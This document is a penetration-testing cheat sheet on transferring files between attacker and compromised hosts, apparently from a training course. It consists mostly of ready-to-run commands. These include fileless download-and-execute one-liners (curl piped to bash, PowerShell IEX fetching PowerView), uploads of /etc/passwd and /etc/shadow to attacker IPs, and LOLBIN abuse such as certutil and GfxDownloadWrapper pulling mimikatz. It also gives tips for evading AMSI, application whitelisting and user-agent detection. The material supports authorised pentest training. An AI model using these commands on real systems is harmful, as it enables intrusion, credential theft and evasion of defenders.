# Transferring Files

## Validating File Transfers

After transferring a file, confirm type and integrity:

```bash
# Linux — check file type
file shell
# e.g. shell: ELF 64-bit LSB executable, x86-64 ...

# Linux — MD5 hash
md5sum shell

# Windows — MD5 hash
Get-FileHash C:\Users\Public\file.exe -Algorithm MD5
```

Hashes must match on both sides; if not, re-transfer.

---

## Web Servers (Attacker-Hosted)

### Python

```bash
python3 -m http.server 80
python2.7 -m SimpleHTTPServer 8000
```

### PHP

```bash
php -S 0.0.0.0:8000
```

### Ruby

```bash
ruby -run -ehttpd . -p8000
```

### Python Upload Server

```bash
pip3 install uploadserver
python3 -m uploadserver
# Upload page at /upload on port 8000
```

With HTTPS (self-signed cert):

```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

### Nginx PUT Upload Server

```nginx
# /etc/nginx/sites-available/upload.conf
server {
    listen 9001;
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo rm /etc/nginx/sites-enabled/default    # if port 80 conflict
sudo systemctl restart nginx.service

# Upload with curl
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```

---

## Downloads — Linux

### wget

```bash
wget https://example.com/LinEnum.sh -O /tmp/LinEnum.sh
```

### curl

```bash
curl -o /tmp/LinEnum.sh https://example.com/LinEnum.sh
```

### Fileless (pipe to interpreter)

```bash
curl https://example.com/LinEnum.sh | bash
wget -qO- https://example.com/script.py | python3
```

### Bash /dev/tcp (no curl/wget needed)

Requires Bash 2.04+ compiled with `--enable-net-redirections`.

```bash
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
cat <&3
```

### Base64 (no network needed)

On attacker:

```bash
cat filetoupload | base64 -w 0; echo
```

On target:

```bash
echo '<base64 string>' | base64 -d > filetoupload
```

---

## Downloads — Windows

### PowerShell — Net.WebClient

```powershell
# Download to disk
(New-Object Net.WebClient).DownloadFile('http://10.10.10.32/nc.exe','C:\Users\Public\nc.exe')

# Async variant
(New-Object Net.WebClient).DownloadFileAsync('http://10.10.10.32/nc.exe','C:\Users\Public\nc.exe')

# Fileless — download string and execute in memory
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.32/PowerView.ps1')

# Pipeline variant
(New-Object Net.WebClient).DownloadString('http://10.10.10.32/PowerView.ps1') | IEX
```

### PowerShell — Invoke-WebRequest

Available in PowerShell 3.0+. Slower than Net.WebClient for large files. Aliases: `iwr`, `curl`, `wget`.

```powershell
Invoke-WebRequest http://10.10.10.32/PowerView.ps1 -OutFile PowerView.ps1
```

**Common errors:**

IE first-launch not completed — add `-UseBasicParsing`:

```powershell
Invoke-WebRequest http://10.10.10.32/PowerView.ps1 -UseBasicParsing | IEX
```

SSL/TLS untrusted certificate:

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### PowerShell — Start-BitsTransfer

BITS must be enabled on the target.

```powershell
Import-Module BitsTransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

### Bitsadmin (CLI)

```cmd
bitsadmin /transfer wcb /priority foreground http://10.10.10.32:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

### CertUtil

AMSI may flag this — consider base64 encoding to bypass.

```cmd
certutil.exe -urlcache -split -f http://10.10.10.32/nc.exe nc.exe
certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```

Base64 encode/decode with CertUtil:

```cmd
certutil.exe -encode nc.exe nc.txt
certutil.exe -urlcache -split -f "http://10.10.10.32/nc.txt" nc.txt
certutil.exe -decode nc.txt nc.exe
```

### PowerShell Base64 Decode (no network)

On attacker (Linux):

```bash
md5sum id_rsa
cat id_rsa | base64 -w 0; echo
```

On target (Windows):

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64 string>"))
Get-FileHash C:\Users\Public\id_rsa -Algorithm MD5
```

**Note:** cmd.exe has an 8,191 character max string length. Web shells may also error on very large strings.

### Proxy-Aware PowerShell Downloader

```powershell
$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("<url>")
```

---

## Uploads — Linux to Attacker

### curl to Python uploadserver

```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

### Python3 upload one-liner

```bash
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

### SCP upload

```bash
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

### Web server on compromised host (reverse download)

Start a web server on the compromised machine and download from attacker:

```bash
python3 -m http.server 8000   # on target
wget 192.168.49.128:8000/filetotransfer.txt   # on attacker
```

---

## Uploads — Windows to Attacker

### PowerShell Base64 Encode (no network)

On target (Windows):

```powershell
[Convert]::ToBase64String((Get-Content -Path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5
```

On attacker (Linux):

```bash
echo '<base64>' | base64 -d > hosts
md5sum hosts
```

### PowerShell — PSUpload.ps1 to uploadserver

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

### PowerShell Base64 POST to Netcat

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

On attacker:

```bash
nc -lvnp 8000
# Capture base64 from POST body, then:
echo '<base64>' | base64 -d -w 0 > hosts
```

### PowerShell — UploadFile to PHP receiver

On attacker, create `/var/www/upload.php`:

```php
<?php
$uploaddir = '/var/www/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

On target:

```powershell
(New-Object System.Net.WebClient).UploadFile('http://10.10.10.32/upload.php', 'C:\file.txt')
```

### CertReq.exe Upload (LOLBIN)

```cmd
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```

Catch on attacker with `nc -lvnp 8000`.

---

## SMB Transfers

### Impacket SMB Server

```bash
# Basic
sudo impacket-smbserver share -smb2support /tmp/smbshare

# With authentication (for newer Windows that block guest access)
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

### Windows — Copy from SMB

```cmd
copy \\10.10.10.32\share\nc.exe
```

If "unauthenticated guest access" is blocked, mount with credentials:

```cmd
net use n: \\10.10.10.32\share /user:test test
copy n:\nc.exe
```

### Windows — Copy to SMB (upload)

```cmd
copy C:\Users\john\Desktop\output.txt \\10.10.14.22\share\output.txt
```

### SMB over HTTP (WebDav)

When SMB (TCP/445) is blocked outbound, WebDav works over HTTP/HTTPS. Windows will fall back to HTTP if SMB fails.

```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

On Windows:

```cmd
dir \\192.168.49.128\DavWWWRoot
copy C:\file.txt \\192.168.49.128\DavWWWRoot\
copy C:\file.txt \\192.168.49.128\sharefolder\
```

`DavWWWRoot` is a special Windows Shell keyword for the WebDav root — no such folder exists on the server.

---

## FTP Transfers

### Python FTP Server

```bash
sudo pip3 install pyftpdlib

# Download server (anonymous, read-only)
sudo python3 -m pyftpdlib --port 21

# Upload server (anonymous, write-enabled)
sudo python3 -m pyftpdlib --port 21 --write
```

### PowerShell FTP Download

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

### PowerShell FTP Upload

```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

### FTP Command File (non-interactive shell)

Download:

```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

Upload:

```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

---

## Netcat / Ncat

### Target listens, attacker sends

```bash
# Target (receiver)
nc -l -p 8000 > SharpKatz.exe       # Original Netcat
ncat -l -p 8000 --recv-only > SharpKatz.exe   # Ncat

# Attacker (sender)
nc -q 0 192.168.49.128 8000 < SharpKatz.exe       # Original Netcat
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe   # Ncat
```

### Attacker listens, target connects (firewall bypass)

```bash
# Attacker (sender, listening)
sudo nc -l -p 443 -q 0 < SharpKatz.exe
sudo ncat -l -p 443 --send-only < SharpKatz.exe

# Target (receiver, connecting)
nc 192.168.49.128 443 > SharpKatz.exe
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

### Bash /dev/tcp as Netcat alternative

If nc/ncat are not available on the target:

```bash
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

### NC with gzip compression

```bash
# Target (receiver)
nc -nvlp 10000 | gzip -d > binary

# Attacker (sender)
cat binary | gzip -c - | nc 10.10.10.32 10000
```

---

## SCP (SSH)

```bash
# Enable SSH on attacker
sudo systemctl enable ssh && sudo systemctl start ssh

# Download from remote to local
scp user@10.10.10.32:/root/file.txt .

# Upload from local to remote
scp /home/kali/linpeas.sh user@10.10.10.100:/tmp

# From target, pull from attacker
scp kali@172.16.6.1:/home/kali/Documents/linpeas.sh .
```

---

## PowerShell Remoting (WinRM)

TCP/5985 (HTTP) or TCP/5986 (HTTPS). Requires admin access or `Remote Management Users` group.

```powershell
# Test connectivity
Test-NetConnection -ComputerName DATABASE01 -Port 5985

# Create session
$Session = New-PSSession -ComputerName DATABASE01

# Copy file TO remote machine
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

# Copy file FROM remote machine
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

---

## RDP File Transfer

### Mount local folder via xfreerdp/rdesktop

```bash
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

Access the mounted drive on the remote machine at `\\tsclient\linux`. Not accessible to other users on the target.

---

## Transferring Files with Code

### Python

```bash
# Python 2 download
python2.7 -c 'import urllib;urllib.urlretrieve("http://10.10.10.32/LinEnum.sh", "LinEnum.sh")'

# Python 3 download
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://10.10.10.32/LinEnum.sh", "LinEnum.sh")'

# Python 3 upload
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

### PHP

```bash
# file_get_contents
php -r '$file = file_get_contents("http://10.10.10.32/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'

# fopen (buffered)
php -r 'const BUFFER = 1024; $fremote = fopen("http://10.10.10.32/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

# Fileless (pipe to bash)
php -r '$lines = @file("http://10.10.10.32/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

### Ruby

```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("http://10.10.10.32/LinEnum.sh")))'
```

### Perl

```bash
perl -e 'use LWP::Simple; getstore("http://10.10.10.32/LinEnum.sh", "LinEnum.sh");'
```

### JavaScript (Windows — cscript.exe)

Save as `wget.js`:

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

```cmd
cscript.exe /nologo wget.js http://10.10.10.32/PowerView.ps1 PowerView.ps1
```

### VBScript (Windows — cscript.exe)

Save as `wget.vbs`:

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

```cmd
cscript.exe /nologo wget.vbs http://10.10.10.32/PowerView.ps1 PowerView.ps1
```

---

## Living off the Land (LOLBAS / GTFOBins)

- [LOLBAS Project (Windows)](https://lolbas-project.github.io) — search `/download` or `/upload`
- [GTFOBins (Linux)](https://gtfobins.github.io/) — search `+file download` or `+file upload`

### OpenSSL Encrypted Transfer (GTFOBin)

```bash
# Attacker — generate cert and serve file
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh

# Target — download file
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

### GfxDownloadWrapper.exe (LOLBIN)

Intel Graphics Driver binary — may bypass application whitelisting:

```powershell
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

---

## Protected File Transfers

### Windows — AES Encryption (PowerShell)

Using [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1):

```powershell
Import-Module .\Invoke-AESEncryption.ps1

# Encrypt
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
# Produces scan-results.txt.aes

# Decrypt
Invoke-AESEncryption -Mode Decrypt -Key "p4ssw0rd" -Path .\scan-results.txt.aes
```

### Linux — OpenSSL Encryption

```bash
# Encrypt
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

# Decrypt
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

Use a strong unique password per engagement.

---

## Detection & Evasion

### User Agent Signatures

Each transfer method has a distinct UA string. Defenders can whitelist/blacklist these:

| Method | User-Agent |
|---|---|
| Invoke-WebRequest | `Mozilla/5.0 (Windows NT; ...) WindowsPowerShell/5.1.14393.0` |
| WinHttp.WinHttpRequest.5.1 | `Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)` |
| Msxml2.XMLHTTP | `Mozilla/4.0 (compatible; MSIE 7.0; ...)` |
| CertUtil | `Microsoft-CryptoAPI/10.0` |
| BITS | `Microsoft BITS/7.8` |

### Changing User Agent

```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

### Alternative COM Download Objects (PowerShell)

```powershell
# WinHttpRequest
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.10.32/nc.exe',$false);$h.send();iex $h.ResponseText

# Msxml2.XMLHTTP
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.10.32/nc.exe',$false);$h.send();iex $h.responseText
```
